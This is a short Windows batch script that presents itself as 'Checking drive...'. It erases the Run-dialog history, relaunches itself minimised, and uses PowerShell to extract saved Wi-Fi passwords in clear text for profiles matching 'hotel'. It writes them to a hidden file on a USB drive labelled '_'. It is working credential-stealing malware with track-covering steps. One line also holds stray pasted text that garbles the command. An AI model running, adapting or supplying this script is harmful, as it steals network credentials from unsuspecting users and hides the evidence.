@echo off
TITLE Checking drive...
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
IF "%1" == "" start "" /min "%~dpnx0" ISMIN && exit or shorter if "%1" == "" start "" /min "%~f0" ISMIN && exit
POWERSHELL "$f=(gwmi win32_volume -f 'label=''_''').Name+'wifi_'+[System.Net.Dns]::GetHostName()+'.txt';(netsh wlan show profiles)|sls '\:(.+)$'|%%{$n=$_.Matches.Groups[1].Value.Trim(); $_}|%%{if ($n -like '*hotel*'){(netsh wlan show profile name=$n key=clear)}}|sls 'Key Content\W+\:(.+)$'|%%{$p=$_.Matches.Groups[1].Value.Trim(); $_}|%%{[PSCustomObject]@{PROFILE_NAME=$n;PASSWORD=$p}}|sort PROFILE_NAME|ft >$f;ATTRIB +S +H $f"
EXIT